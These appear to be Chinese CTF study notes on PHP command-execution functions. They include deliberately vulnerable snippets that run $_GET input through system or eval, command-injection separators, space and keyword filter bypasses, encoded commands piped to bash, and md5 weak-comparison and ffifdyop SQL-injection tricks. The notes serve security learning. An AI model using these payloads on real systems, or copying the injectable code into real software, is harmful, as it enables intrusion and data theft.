# php常见命令执行函数
怎么运行，运行条件，参数，能否回显（根据橙子科技网课整理）

## system
system(string $command, int &$return_var = ?)

• command：执行 command 参数所指定的命令，并且输出执行结果

• 如果提供 return_var 参数，则外部命令执行后的返回状态将会被设置到此变量中。

```php
<?php
  highlight_file(__FILE__);
$cmd = $_GET["benben"];
if(isset($cmd)){
  system($cmd);
}
  ?>
```

传参：?benben=ls

说明

• highlight_file(_**FILE_**)：把当前php源码高亮显示出来

• $_GET["benben"]：接收url里benben这个参数的值

• isset()：判断参数benben是否传了

• system()：执行传入的系统命令，并直接输出命令结果

直接敲ls时会把指令运行的结果回显到当前页面

## exec
exec(string $command, array &$output = ?, int &$return_var = ?)

参数说明

1. $$ command：需要执行的系统命令。单独只写exec( $$command)时，仅获取命令输出的最后一行，不会自动打印回显。
2. &$output：引用类型数组，命令执行的输出内容会逐行存入这个数组，一行对应数组里一个元素。
3. &$return_var：引用类型整型变量，用来接收命令执行后的状态返回码（0代表执行成功，非0代表失败）。

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
exec($cmd,$array);
print_r($array);
?>
```

借用print_r输出结果

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
exec($cmd,output:$dazhuang);
var_dump($dazhuang);
?>
```

这个可以把结果一行一行回显出来

## passthru
passthru(string $command, int &$return_var = ?)

参数说明

1. $command：要执行的系统命令

2. &$return_var：引用类型变量，用来接收命令执行的状态返回码（0代表执行成功）

特点

passthru 会直接将命令的原始输出（包括二进制数据）发送到浏览器，自动回显结果，适合输出图片这类二进制流，和system很像



## shell_exec
shell_exec(string $cmd)

参数说明

$cmd：要执行的系统命令。

特点

在shell环境执行命令，把完整输出以字符串形式返回，不会自动打印到页面；功能等价于PHP反引号 ` `。

必须搭配 echo、print 才能看到命令结果

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
echo shell_exec($cmd);
?>
```

```php
?cmd=ls
```

## 反引号
同样没回显，需要借助echo

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
echo `$cmd` , PHP_EOL;
?>
```





## popen
popen(string $command, string $mode)

参数说明

1. $command：要执行的系统命令

2. $mode：管道模式

• 'r'：阅读模式，读取命令输出

• 'w'：写入模式，向命令传入数据

特点：类似于命令执行完写入一个临时文档，这个文档在进程里面，命令执行完结果并不显示在页面上而是直接在进程里保留，执行结果需要用fgets或者fread去读取才能回显，单独打印打不出来

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$ben = popen($cmd, 'r');
while($s = fgets($ben)){
    print_r($s);
}
pclose($ben);
?>
```

```php
?cmd=whoami
```



# proc_open
proc_open($command, $descriptor_spec, $pipes, $cwd, $env_vars, $options)

参数说明

1. $command：要执行的系统命令

2. $descriptor_spec：描述符数组，定义标准输入、标准输出、标准错误的通道形式（pipe / file）

3. $pipes：传出参数，执行后会保存管道资源句柄

4. $cwd：工作目录（可选）

5. $env_vars：环境变量（可选）

6. $options：额外选项（可选）

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$array = array(
    array("pipe","r"),   // 0 标准输入
    array("pipe","w"),   // 1 标准输出
    array("file","/tmp/error-output.txt","a") // 2 标准错误，写入文件
);
$fp = proc_open($cmd,$array,$pipes);
echo stream_get_contents($pipes[1]);
proc_close($fp);
?>
```

# pcntl_exec
想用需要单独安装，并且命令需要是二进制命令

pcntl_exec(string $path, array $args = ?, array $envs = ?)

参数说明

path必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。

args是一个要传递给程序的参数的字符串数组。

envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

# 操作系统的链接符
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
if(isset($cmd)){
    system("ls".$cmd);
}
?>
```

代码拼接 ls + 传入的 $cmd，需要命令分隔符来跳出ls，执行新命令。

可用分隔符：; | & && ||

## ；
;

使多个命令按顺序执行

前面的命令和后面的命令都会执行,前面的指令出错不会影响后面的指令

#id;ls;pwd



```php
？cmd=;cat%20flag.php
```

## &
& 放在命令末尾，把前面命令丢到后台执行，然后继续执行后面命令。

两条命令并行执行，互不等待。

```php
?cmd=%26id
```

注意：在URL里单独的 & 是参数分隔符！

直接写 ?cmd=&id，浏览器会识别成两个参数：cmd= 和 id=，注入失败，所以URL里要编码：%26

## &&
前面命令执行成功，才执行后面的命令

```php
?cmd=1%26%26id
```

## ｜
把前面命令的输出，传给后面命令当作输入，最终只展示后面命令的输出

```php
echo "ls -l"
```

只打印字符串 ls -l，不会执行命令

```php
echo "ls -l" | /bin/bash
```

管道符 |：把前面 echo 的输出字符串，传给 /bin/bash 去执行

等价于直接运行 ls -l，输出目录详情

## || 
前面命令执行失败，才执行后面的命令；前面成功，后面不执行，类似 if-else

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
$cmd = $cmd.">/dev/null 2>&1";
if(isset($cmd)){
system($cmd);
}
?>
```

```php
?cmd=ls
```

拼接：ls >/dev/null 2>&1  输出丢垃圾桶，无回显

```php
?cmd=ls||id
```

拼接：ls||id >/dev/null 2>&1

ls执行成功，id不会执行，>/dev/null 2>&1 不会执行

# 空格过滤绕过
```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET["cmd"];
if(isset($cmd)){
    $cmd = preg_replace("# #","",$cmd);
    echo "过滤后的命令: ".$cmd."<br>";
    echo "命令执行结果如下: ";
    system($cmd);
}
?>
```

preg_replace("# #","",$cmd) 把所有空格替换成空，空格被删掉

## 绕过方法
1. 大括号 {cat,flag.txt};

2. $IFS 代替空格；$IFS、${IFS}、$IFS$9

Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。

```php
?cmd=ls$IFS-l
```

单纯$IFS2，IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。

```php
?cmd=ls${IFS}-l
```

$IFS$9 – 后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串。

```php
?cmd=ls$IFS$9-l
```

3. 重定向字符 <，<>；

< 表示的是输入重定向的意思，就是把<后面跟的文件取代键盘作为新的输入设备

```php
?cmd=cat<flag.php
```

```php
?cmd=cat<>flag.php
```

4. %09(Tab)，%20(space);

```php
?cmd=cat%09flag.php
```

%20编码出来还是空格，有可能还运行不出来

# 文件名过滤绕过
```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
$cmd = $_GET['cmd'];
if(isset($cmd)){
if(!preg_match("/flag|system|php/i",$cmd)){
eval($cmd);
}
else{
echo "命令有问题哦，来黑我丫！！！";
}
}
?>
```

flag|system|php 被过滤

## 绕过方法
1.通配符 ? * 绕过

通配符是一种特殊语句，主要有问号（?）和星号（*），用来模糊搜索文件。

? 在linux里面可以进行代替字母。? 仅代表单个字符，但此单字必须存在。

```php
cat fl?g.tx?
```

• 在linux里面可以进行模糊匹配。*可以代表任何字符串。

```php
cat f*
```

```php
?cmd=passthru('cat fl?g.p?p');
```

```php
?cmd=passthru('cat fl*');
```

2.单引号、双引号绕过

"、""空字符

```php
?cmd=passthru('cat fl""ag.ph""p');
```

```php
#echo fl""ag.ph""p
```

3.反斜杠 \ 绕过

把特殊字符去掉功能性，单纯表示为字符串

```php
#echo benben > -dazhuang
```

```php
#cat fl\ag.t\xt
```

在linux里面，可以做两个命令的连接符，说明第一个命令没执行完

4.特殊变量：$1到$9、@$和$*等

输出为空

```php
#cat fl$1ag.t$9xt
```

```php
#cat fl$*\ag.txt
```

5.内联执行

自定义字符串，再拼接起来

```php
#a=f;d=ag;c=l;cat $a$c$d.txt
```

6.利用linux的环境变量

使用环境变量里的字符执行变量。

```php
#echo $PATH
```

PATH默认系统环境变量

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```php
#echo f${PATH:5:1}
```

使用环境变量PATH里的第5个字符，（从0开始计数，":"为第5个字符），显示1个字符；

# 常见文件读取命令绕过
绕过方法

1. tac：反向显示

与cat功能类似，但是反向显示，从最后一行往前开始显示。

```php
#tac flag.txt
```

当前页面可直接显示

2. more：一页一页的显示档案内容；

```php
?cmd=passthru("more fl\ag.ph\p");
```

3. less：与 more 类似；

```php
?cmd=passthru("less fl\ag.ph\p");
```

4. tail：查看末尾几行；

```php
?cmd=passthru("tail fl\ag.ph\p");
```

5. nl：显示的时候，顺便输出行号；

```php
?cmd=passthru("nl fl\ag.ph\p");
```

6. od：以二进制的方式读取档案内容；

```php
?cmd=passthru("od -A d -c fla\g.ph\p");
```

7. xxd：读取二进制文件；

```php
?cmd=passthru("xxd fla\g.ph\p");
```

8. sort：主要用于排序文件；

```php
#sort flag.txt
```

```php
?cmd=passthru("/usr/bin/s?rt fla\g.ph\p");
```

9. uniq：报告或删除文件中重复的行；

```php
?cmd=passthru("uniq fla\g.ph\p");
```

uniq 去重，也可以用来读取文件内容。

10. file -f：报错出具体内容；

```php
?cmd=passthru("file -f fla\g.ph\p");
```

原理：file -f 会把文件内容当成参数尝试解析，报错时回显文件内容，实现读取。

11. grep：在文本中查找指定的字符串；

```php
?cmd=passthru("grep fla fla*");
```

原理：grep 匹配读取文件内容，fla* 通配匹配 flag 文件，也可以用{}

# 编码绕过
## 绕过原理
把读取文件的命令编码，传给服务器，服务器解码后执行，过滤拦截不到原始关键字。

1.base64编码绕过

```python
import base64
S = b'cat flag.php'
e64 = base64.b64encode(S)
print(e64)
```

```php
?cmd=system(base64_decode('Y2F0IGZsYWcucGhw'));
```

```php
echo Y2F0IGZsYWcucGhw | base64 -d
```

echo 输出base64字符串，base64 -d 解码，管道交给bash执行解码后的命令。

```php
echo Y2F0IGZsYWcucGhw | base64 -d | bash
```

2.base32编码

3.HEX编码

```python
import binascii
s = b"tac flag.php"
h = binascii.b2a_hex(s)
print(h)
```

```python
echo "74616320666c61672e706870" | xxd -r -p | bash
```

• xxd -r -p：把十六进制还原成原始字符串

• | bash：交给bash执行

```python
?cmd=passthru('echo "74616320666c61672e706870"|xxd -r -p|bash');
```

4.shellcode编码

当服务器没有装xxd时可以用这种方式

```python
?cmd=passthru('printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70" | bash');
```

```python
?cmd=passthru(`printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"`);
```

还可以用system，$()

# 内建函数


**<font style="color:rgba(0, 0, 0, 0.87);">文件操作函数</font>**<font style="color:rgba(0, 0, 0, 0.87);">：</font>

+ include()：导入并执行指定的 PHP 文件。例如：include('config.php'); 会导入并执行 config.php 中的代码。
+ require()：类似 include()，但文件不存在会产生致命错误。
+ include_once() / require_once()：与 include / require 类似，但只导入一次。
+ fopen()：打开一个文件或 URL。例如：$file = fopen("test.txt", "r"); 以只读模式打开 test.txt。
+ file_get_contents()：读取文件全部内容到字符串。例如：$content = file_get_contents("test.txt");
+ file_put_contents()：将字符串写入文件。例如：file_put_contents("test.txt", "Hello World!");



**<font style="color:rgba(0, 0, 0, 0.87);">代码执行函数</font>**<font style="color:rgba(0, 0, 0, 0.87);">：</font>

+ eval()：执行字符串中的 PHP 代码。例如：eval('$x = 5;'); 会设置 $x 为 5。
+ assert()：用于调试，检查一个条件是否为 true（字符串模式会把字符串当代码执行，PHP 7 已废弃）。
+ create_function()：创建匿名函数（本质是 eval）。例如：$func = create_function('$x', 'return $x + 1;'); $func(5) 返回 6。
+ system() / shell_exec() / exec() / passthru()：执行外部程序或系统命令。例如：system("ls"); 会执行 ls 命令并显示输出。

**<font style="color:rgba(0, 0, 0, 0.87);">反序列化函数</font>**<font style="color:rgba(0, 0, 0, 0.87);">：</font>

+ unserialize()：将已序列化的字符串转回 PHP 的值。例如：$array = unserialize($serializedStr); 将序列化数组字符串转为数组。

**<font style="color:rgba(0, 0, 0, 0.87);">数据库操作函数</font>**<font style="color:rgba(0, 0, 0, 0.87);">：</font>

+ mysql_query() / mysqli_query()：发送一个 MySQL 查询。例如：$result = mysql_query("SELECT * FROM users");

**其他函数**：

+ call_user_func(): 调用回调函数。例如: call_user_func('system', 'cat /flag');
+ call_user_func_array(): 调用回调，参数用数组传入。例如: call_user_func_array('system', ['cat /flag']);
+ array_map(): 对数组每个元素应用回调。例如: array_map('system', ['cat /flag']);
+ usort(): 用回调对数组排序(回调可能被执行)。例如: usort($arr, 'system');
+ array_filter(): 用回调过滤数组(元素传给回调)。例如: array_filter(['cat /flag'], 'system');
+ array_reduce(): 用回调迭代归约数组。例如: array_reduce($arr, 'system');
+ create_function(): 创建匿名的 lambda 函数(本质是 eval)。例如: $func = create_function('$x', 'return $x + 1;'); 返回的 $func 可调用。
+ preg_replace(): 正则搜索替换。例: preg_replace("/apple/i", "orange", $str) → 把 $str 里 'apple' 换成 'orange'。（加 /e 会把替换串当代码执行，PHP 7 已移除）

# MD5
MD5（Message Digest Algorithm 5）是一种常用的哈希函数，用于产生128位（16字节）的哈希值，通常以32个十六进制数字表示

## 特点
+ 固定长度输出：MD5生成的哈希值长度固定为128位，无论输入数据的大小。
+ 快速计算：MD5的计算速度相对较快，适用于对大量数据进行哈希运算。
+ 不可逆性：MD5是一种单向哈希函数，即从哈希值无法还原出原始数据。
+ 碰撞概率：尽管MD5具有广泛的应用，但由于其算法设计存在漏洞，导致在一些情况下可能出现碰撞（即不同的输入数据产生相同的哈希值）。这种碰撞风险降低了MD5在一些安全性要求较高的场景中的适用性。

## 强弱比较
强比较：使用三个 ''==='' 比较，值和类型都比较

弱比较：使用两个 ''=='' 比较，只比较值，不比较类型

做的几道题目都需要去绕过这些比较，常见方法有两种，0e和数组绕过

### 0e绕过
科学记数法是一种记数的方法。

计算器表达10的幂一般是用E或e

如：2 760 000   =    2.76×10^6    =    2.76e6

所以0e，无论后面跟什么值，都是0

原理：PHP在处理字符串时会出现缺陷，如果字符串为’5e2’，本来只是一个正常字符串，但PHP会认为这是科学计数法里的e，那么PHP进行比较时会将这个字符串按照科学计数法计算，即5e2=5*10^2=500，因此0e100被认为和0相等。md5加密后的哈希值是一串16进制数，因此需要哈希值第一位为0，第二位为e即可，后面不论是什么都认为和0相等。

常用值

```php
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
```

### 数组绕过
无论是PHP弱比较还是强比较，md5()函数无法处理数组，如果传入的是数组，会返回NULL，两个数组经过加密后返回值均为NULL，形成相等，虽然会报错，但是null=null，逻辑关系为True，所以可以输出flag，比如传入md5(a[]=1)==md5(b[]=2)，实际上是null==null，所以数组进行md5弱比较时，结果相等

```php
?a[]=1&b[]=2
```

另一种强比较绕过：md5完全相同的字符绕过

```php
？a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

### 万能通式ffifdyop绕过
万能通式：129581926211651571912466741651878684928和ffifdyop

```php
select * from 'admin' where password=md5($pass,true)
```

```php
md5('ffifdyop',true)
```

原理ffifdyop 这个字符串被 md5 哈希了后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是' or '6

而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from 'admin' where password= '  ' or '6xxxxx '，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。

where password=正确的密码or 1 ，代表永真，那么前面有没有密码都无所谓了

简单说，

select * from admin where password= '    '  or'6<乱码>'

就相当于

select * from admin where password=  '    '      or 1  实现sql注入

当两个条件中有任一个条件满足，“逻辑或”的运算结果就为“真”

逻辑与”相当于生活中说的“并且”，就是两个条件都同时成立的情况下“逻辑与”的运算结果才为“真”。

## md5碰撞
简单来讲，就是基于MD5的工作原理，得出以下属性的MD5算法：给定两个输入M和N，如果MD5(M) = MD5(N)，也就是说，若MD5哈希的M和N是相同的，那么对于任何输入T，MD5（M || T）= MD5（N || T），其中||表示连接。也就是说，如果输入M和N具有相同的散列值，那么向它们添加相同的后缀T将得到两个具有相同散列值的输出。这个属性不仅适用于MD5哈希算法，也适用于许多其他哈希算法。

        因此，可以给生成的两个不同的文件加上相同的后缀，导致的结果就是一个文件的两数组内容相同，另一个则不同，但两文件的MD5哈希值依然相同。







